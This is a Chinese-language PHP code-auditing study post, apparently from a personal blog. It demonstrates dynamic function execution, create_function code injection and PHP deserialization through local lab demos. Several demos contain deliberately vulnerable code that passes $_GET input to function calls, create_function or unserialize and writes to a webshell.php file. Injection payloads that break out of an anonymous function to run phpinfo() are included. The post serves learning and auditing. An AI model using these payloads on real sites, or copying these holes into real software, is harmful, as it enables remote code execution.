@@ -161,6 +161,196 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Nayon.png">
+      <meta itemprop="name" content="Nayon">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">PHP代码审计学习-3</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-25 12:37:09" itemprop="dateCreated datePublished" datetime="2021-10-25T12:37:09+08:00">2021-10-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-25 17:18:53" itemprop="dateModified" datetime="2022-01-25T17:18:53+08:00">2022-01-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="动态函数执行和匿名函数执行"><a href="#动态函数执行和匿名函数执行" class="headerlink" title="动态函数执行和匿名函数执行"></a>动态函数执行和匿名函数执行</h3><h4 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h4><p>函数与函数之间的调用，可能会产生漏洞。</p>
+<p>测试demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$args1</span>(<span class="variable">$args2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">c(<span class="variable">$action</span>,<span class="variable">$cmd</span>);</span><br><span class="line"><span class="comment">//浏览器获取到的值 b ，现在作为 c() 函数的参数插入到了函数中，并且在函数中作为函数名调用了另外一个函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025160512247.png" alt="image-20211025160512247"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>$action</code>、<code>$cmd</code> 动态传递参数，执行命令</p>
+<h4 id="匿名函数-Anonymous-functions"><a href="#匿名函数-Anonymous-functions" class="headerlink" title="匿名函数(Anonymous functions)"></a>匿名函数(Anonymous functions)</h4><p>也被称之为闭包函数(closures)，允许临时创建一个没有指定名称的函数。最经常用作回调函数(callback)参数的值</p>
+<p>测试demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>]; <span class="comment">//GET方式传入值</span></span><br><span class="line"><span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>; <span class="comment">//strnatcasecmp 用于 比较字符串大小</span></span><br><span class="line"><span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>; <span class="comment">//return 1*(0/1)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;this is test&#x27;</span>;</span><br><span class="line">usort(<span class="variable">$databases</span>, create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>)); <span class="comment">//此处创建一个匿名函数 $a $b作为参数传给$sort_function</span></span><br><span class="line"><span class="comment">//// 匿名函数相当于隐式函数大概内内部是如此，我们可以将传参的$sort_by 做一些处理，比如说闭合，使其能拼接执行恶意代码</span></span><br><span class="line"><span class="comment">//function xxx($a,$b)&#123;</span></span><br><span class="line"><span class="comment">//    return 1*strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();/*,$b[&#x27;2&#x27;]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//echo &#x27;nayon&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>匿名函数create_function()在其中创建的函数大概为如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function xxx($a,$b)&#123;</span><br><span class="line">    return 1*strnatcasecmp($a[&quot;1&quot;],$b[&#x27;2&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;nayon&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用<code>&#125;</code>闭合匿名函数，继续写上恶意代码，然后再/*注释掉垃圾字符。</p>
+<p>由此我们可以拼接出利用payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort_by=<span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025163501429.png" alt="image-20211025163501429"></p>
+<p>测试demo：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$lambda</span>=create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&quot;return (strlen(<span class="subst">$a</span>)-strlen(<span class="subst">$b</span>)+&quot;</span> . <span class="string">&quot;strlen(<span class="subst">$c</span>));&quot;</span>);</span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;reall long string here,boy&#x27;</span>,<span class="string">&#x27;this&#x27;</span>,<span class="string">&#x27;midding lenth&#x27;</span>,<span class="string">&#x27;larget&#x27;</span>);</span><br><span class="line">usort(<span class="variable">$array</span>,<span class="variable">$lambda</span>);</span><br><span class="line">print_r(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>$c</code>处未存在过滤,可构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:3));&#125;phpinfo();/* #/用于注释多出的));以及匿名函数所会生成的&#125;</span><br><span class="line">payload2:3));&#125;phpinfo();&#123;((1 #利用&#123; 和((将多出的字符闭合</span><br></pre></td></tr></table></figure>
+
+<p>匿名函数中大概这样，进行执行phpinfo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> (strlen(<span class="variable">$a</span>)-strlen(<span class="variable">$b</span>)+strlen(<span class="number">1</span>));&#125;</span><br><span class="line">phpinfo();&#123;</span><br><span class="line">    ((<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025164600761.png" alt="image-20211025164600761"></p>
+<h3 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。<code>序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保存函数方法</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php序列化的函数为serialize 可以将对象中的成员变量转换成字符串。</span><br><span class="line">php反序列化的函数为unserialize  可以将序列化生成的字符串重新还原为对象中的成员变量。</span><br></pre></td></tr></table></figure>
+
+<p><code>将用户可控的数据进行反序列化</code> 就是所谓的php反序列化漏洞</p>
+<h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><p>序列化的目的是方便数据的传输与储存。</p>
+<p>php应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie缓存等。</p>
+<p>常见的序列化格式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">二进制格式</span><br><span class="line">字节数组</span><br><span class="line">json字符串</span><br><span class="line">xml字符串</span><br></pre></td></tr></table></figure>
+
+<p>序列化测试demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;This is B&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(serialize(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure>
+
+<p>输出值:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\phplearn\global.php:<span class="number">11</span>:string &#x27;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;&#x27; (length=<span class="number">96</span>)</span><br></pre></td></tr></table></figure>
+
+<p>实际上的序列化字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化字符串结构</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:对象名的长度:<span class="string">&quot;对象名&quot;</span>:对象属性个数:&#123;s[属性的类型，字符串s 整型i....]:属性名的长度:<span class="string">&quot;属性名&quot;</span>;s:属性值的长度:<span class="string">&quot;属性值&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，序列化后，共有3个属性在序列化字符串中，函数方法test1未能进行序列化</p>
+<p>序列化后的结果是字符串string</p>
+<p>test是一个类，new test()代表创建test类的对象</p>
+<p>O表示对象，4表示类名共有4个字符长 ，test是类的名称</p>
+<p>3是序列化对象中共有三个成员变量。括号內部依序是<code>类型、名称、值</code>,同时变量与变量之间由分号隔开</p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025174739757.png" alt="image-20211025174739757"></p>
+<p>在这其中，a是public类型变量、s表示字符串、1表示变量名长度，a是变量名。</p>
+<p>b是protected类型的变量，它的变量名长度为4，也就是在名字前加上了%00*%00变为了<code>%00*%00b</code> ,所以我们可以得知protected属性的表示方法是在变量名前加上<code>%00*%00</code></p>
+<p>c是private类型的变量，c的变量名前加上类%00类名%00变量名 即<code>%00类%00c</code>表名此是私有变量</p>
+<p>虽说在test类中存在test1方法，但php序列化中，并不会保存方法。</p>
+<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(<span class="variable">$e</span> = serialize(<span class="variable">$test</span>)); <span class="comment">//打印输出序列化字符串</span></span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="variable">$e</span>)); <span class="comment">//反序列化字符串</span></span><br></pre></td></tr></table></figure>
+
+<p>打印输出:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is A&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="string">&quot;c&quot;</span>:<span class="string">&quot;test&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is C&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，类的成员变量被还原，它们是否公有、私有、保护的类型也得到正确的表示。</p>
+<h5 id="在php中所能用到的魔术方法"><a href="#在php中所能用到的魔术方法" class="headerlink" title="在php中所能用到的魔术方法"></a>在php中所能用到的魔术方法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php类可能会包含魔术方法，魔术方法命名都是以`__`开始，例如 `__construct`，`__destruct`,`__toString`,`__sleep`,`__wakeup`，魔法函数在某些情况下会自动调用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct(): 有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line">__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">__toString():一个类被当成字符串时应该如何回应，例如echo $obj打印类时，若存在__toString魔法函数，将会自动调用.</span><br><span class="line">__sleep(): 在一个对象被序列化之前调用</span><br><span class="line">__wakeup():unserialize()会检查是否存在一个_wakeup()方法。如果存在，则会首先调用__wakeup方法，为对象进行处理。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct() #当对象被创建时调用</span><br><span class="line">__destruct() #当对象被销毁时调用</span><br><span class="line">__toString() #当对象被当做字符串时使用</span><br><span class="line">__sleep() #在对象被序列化之前调用</span><br><span class="line">__wakeup() #在对象unserialize()之前进行调用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;str&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类被实现时，php首先检测类中是否存在__construct方法，存在先执行其魔术方法再实现</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;new了一个对象，对象被创建，执行__construct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化之前检查类中是否存在__sleep()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;serialize了一个对象，对象被序列化，先执行__sleep，再序列化&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$sTest</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//__wakeup()在反序列化之间执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$usTest</span> = unserialize(<span class="variable">$sTest</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象被当做字符串使用时，__toString方法被触发，执行其中内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;把Test对象当做字符串使用，执行__toString&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;use Test obj as str &#x27;</span>.<span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//程序执行完毕，对象销毁释放，执行__destruct方法.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;程序执行完毕，对象自动销毁，执行__destruct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025195535420.png" alt="image-20211025195535420"></p>
+<h5 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h5><p>攻击者可以操纵unserialize的参数，以构造恶意的序列化字符串，当应用程序将恶意字符串反序列化为对象后，恶意代码得以执行，这就造成了php反序列化漏洞。</p>
+<p>demo:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&#x27;wakeup!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct complate&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> A);</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用echo ，拿到序列化后的恶意字符串，通过test传参进入</p>
